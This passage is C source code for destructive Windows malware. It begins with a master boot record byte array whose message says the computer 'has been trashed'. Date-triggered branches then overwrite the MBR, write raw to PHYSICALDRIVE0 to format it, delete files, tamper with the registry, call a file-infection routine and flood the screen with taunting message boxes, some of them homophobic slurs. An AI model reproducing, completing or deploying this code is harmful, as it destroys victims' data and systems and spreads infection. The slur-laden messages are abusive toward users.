	0xFB, 0x0E, 0x24, 0x0E, 0x99, 0x0C, 0x68, 0x9D, 0x0E, 0x68, 0xA9, 0x08, 0x68, 0xDD, 0x04, 0x68, 
	0xD3, 0x04, 0x83, 0x70, 0x09, 0x00, 0x0A, 0x68, 0xE9, 0x06, 0x68, 0xAF, 0x0C, 0x81, 0x00, 0x2A, 
	0x68, 0x9D, 0x6C, 0xB1, 0x68, 0x28, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 
	0x74, 0x65, 0x72, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x74, 0x72, 0x61, 
	0x73, 0x68, 0x65, 0x64, 0x2E, 0x20, 0x52, 0x65, 0x73, 0x74, 0x20, 0x69, 0x6E, 0x20, 0x70, 0x65, 
	0x61, 0x63, 0x65, 0x2E, 0x2E, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
	if(examdate(3)){
		die();
		OverwriteMBR(mbrChar);
		HANDLE hDevice = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		FindAndForMat(hDevice, 0);
		CreateThread(NULL, 0, del, NULL, 0, NULL);
		MessageBox(NULL,"PC too hot!!!!!!", "uh-oh!", MB_OK|MB_ICONERROR);
		CreateThread(NULL, 0, meltforxp, NULL, 0, NULL);
		CreateThread(NULL, 0, meltforxp, NULL, 0, NULL);
		CreateThread(NULL, 0, meltforxp, NULL, 0, NULL);
		CreateThread(NULL, 0, meltforxp, NULL, 0, NULL);
		CreateThread(NULL, 0, meltforxp, NULL, 0, NULL);
		CreateThread(NULL, 0, meltforxp, NULL, 0, NULL);
		melt();
	}
	if(examdate(4)){
		die();
		CreateThread(NULL, 0, del, NULL, 0, NULL);
		MessageBox(NULL,"Gay Dectected Using This PC!!!", "uh-oh!", MB_OK|MB_ICONERROR);
		while(MessageBox(NULL,"is it you???", "GAY", MB_YESNO|MB_ICONERROR) == IDNO){
			HANDLE hDevice = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
			FindAndForMat(hDevice, 0);
			MessageBox(NULL,"What?", "...", MB_OK|MB_ICONERROR);
			MessageBox(NULL,"You are!!!", "yeah", MB_OK|MB_ICONERROR);
			MessageBox(NULL,"for punishment...", "...", MB_OK|MB_ICONERROR);
			MessageBox(NULL,"your pc is fucked!", "...", MB_OK|MB_ICONERROR);
		}
		MessageBox(NULL,"U R A GAY!!!\nHAHAHAHAHAHAHAHA!!!", "The gay is you", MB_OK|MB_ICONERROR);
		CreateThread(NULL, 0, shakewnd, NULL, 0, NULL);
		CreateThread(NULL, 0, reversetext, NULL, 0, NULL);
		CreateThread(NULL, 0, msgthread, NULL, 0, NULL);
		Sleep(5000);
		CreateThread(NULL, 0, RegistryFuck, NULL, 0, NULL);
	}
	if(examdate(5)){
		die();
		CreateThread(NULL, 0, shakewnd, NULL, 0, NULL);
		CreateThread(NULL, 0, del, NULL, 0, NULL);
		int cnt = 5;
		while(cnt){
			if(MessageBox(NULL,"Try to hit yes", "Heh.", MB_YESNO|MB_ICONERROR) == IDNO){
				MessageBox(NULL,"You are an idiot!!!", "You hit no.", MB_OK|MB_ICONERROR);
			}
			cnt --;
		}
		CreateThread(NULL, 0, reversetext, NULL, 0, NULL);
		CreateThread(NULL, 0, RegistryFuck, NULL, 0, NULL);
		MessageBox(NULL,"k,i won't play with you anymore...\njust see ur personal files.", "Just ME", MB_OK|MB_ICONINFORMATION);
		MSG();
	}
	if(examdate(6)){
		die();
		CreateThread(NULL, 0, shakewnd, NULL, 0, NULL);
		CreateThread(NULL, 0, del, NULL, 0, NULL);
		HANDLE hDevice = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		FindAndForMat(hDevice, 0);
		CreateThread(NULL, 0, dirtypc, NULL, 0, NULL);
		CreateThread(NULL, 0, dirtypc, NULL, 0, NULL);
		CreateThread(NULL, 0, dirtypc, NULL, 0, NULL);
		CreateThread(NULL, 0, shake, NULL, 0, NULL);
		while(1) {
			CreateThread(NULL, 0, dirtypcmsg, NULL, 0, NULL);
			Sleep(2000);
		}
	}
	if(examdate(7)){
		playboard7("C:\\");
		playboard7("D:\\");
		playboard7("E:\\");
		playboard7("F:\\");
		playboard7("G:\\");
		CreateThread(NULL, 0, dirtypc, NULL, 0, NULL);
		CreateThread(NULL, 0, dirtypc, NULL, 0, NULL);
		CreateThread(NULL, 0, dirtypc, NULL, 0, NULL);
		CreateThread(NULL, 0, block, NULL, 0, NULL);
		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);
		RECT rekt;
		GetWindowRect(hwnd, &rekt);
		while(1){
			BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
			MessageBox(NULL,"fred durst said:no computer today silly boy go outside to play.", "Fred Durst", MB_OK|MB_ICONWARNING);
		}
	}
	Disable();
	infectfile();
	return 0;
}